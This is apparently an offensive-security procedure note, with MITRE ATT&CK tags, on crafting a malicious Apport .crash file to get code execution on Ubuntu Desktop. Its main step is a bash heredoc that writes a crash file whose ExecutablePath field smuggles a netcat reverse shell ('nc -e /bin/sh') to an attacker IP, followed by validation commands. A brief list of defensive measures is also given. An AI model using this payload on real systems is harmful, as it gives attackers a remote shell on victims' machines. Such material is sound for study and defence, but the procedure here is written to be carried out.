---
id: b2c3d4e5-f6g7-8901-bcde-f23456789012
tags:
  - rce
  - command-injection
  - apport
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/create-malicious-crash-file]]'
verified: false
platforms:
  - Linux
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[Exploitation for Client Execution]]'
updated_at: '2025-12-14T17:23:24.439Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploitation for Client Execution]]'
---
# Craft-Malicious-Apport-Crash-File-for-RCE

## Summary

This procedure details crafting a malicious .crash file to exploit command injection vulnerabilities in Canonical's Apport software, enabling arbitrary code execution when the file is opened on vulnerable Ubuntu Desktop systems (12.10+).

## Description

Apport, the default crash reporting tool on Ubuntu Desktop, processes .crash files by parsing fields like ExecutablePath and Stacktrace, which can lead to command injection during gdb invocation or report generation. An attacker crafts a file with a payload that breaks out of the expected string format (e.g., using semicolons or backticks) to execute system commands. This is particularly effective against default installations where Apport is enabled. Prerequisites include understanding Apport's file format (text-based key-value pairs) and basic Linux command knowledge. Expected outcome: RCE upon file processing.

## Requirements

1. Linux environment for crafting the file
2. Knowledge of Apport .crash format (from Launchpad bug reports)
3. Target: Ubuntu Desktop 12.10+ with Apport installed

## Defense

Defensive measures and detection strategies:

- Disable Apport via `sudo systemctl disable apport` or edit /etc/default/apport
- Scan for anomalous .crash files with unusual ExecutablePath contents
- Use file openers that sandbox or warn on crash reports
- Monitor for unexpected command executions (e.g., via auditd logs)

## Objectives

1. Generate a valid .crash file with embedded command injection payload
2. Ensure compatibility with Apport's parsing logic
3. Achieve RCE without crashing the parser prematurely

## Instructions

### Step 1: Prepare the Payload

**Context**: Define the injection point, typically in ExecutablePath or ProcCmdline, where Apport passes input to shell commands like gdb.

**Command** ([[commands/create-malicious-crash-file]]):
```bash
cat > malicious.crash << EOF
ProblemType: Crash
Architecture: i386
CrashCounter: 1
Date: $(date)
ExecutablePath: /bin/ls; nc -e /bin/sh 192.168.1.100 4444 #
ProcCmdline: ls
ProcEnviron:
ProcStatus:
Signal: 11
StacktraceTop:

EOF
```

> This command creates a .crash file with a payload in ExecutablePath that lists files and connects a reverse shell to the attacker's IP (replace 192.168.1.100 with your listener IP). Expected output: File written to disk; verify with `cat malicious.crash` showing the injection.

### Step 2: Validate the File Format

**Context**: Ensure the file mimics a legitimate crash report to avoid detection.

**Command** ([[commands/create-malicious-crash-file]]):
```bash
file malicious.crash
head -20 malicious.crash
```

> Confirms it's a text file and displays contents. Expected output: "malicious.crash: ASCII text" and key-value pairs visible.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Exploitation for Client Execution]] Exploitation for Client Execution

### Sub-Techniques


## Commands Used

- [[commands/create-malicious-crash-file]]

## Tools Used


## Tags

- rce
- command-injection
- apport
- ubuntu
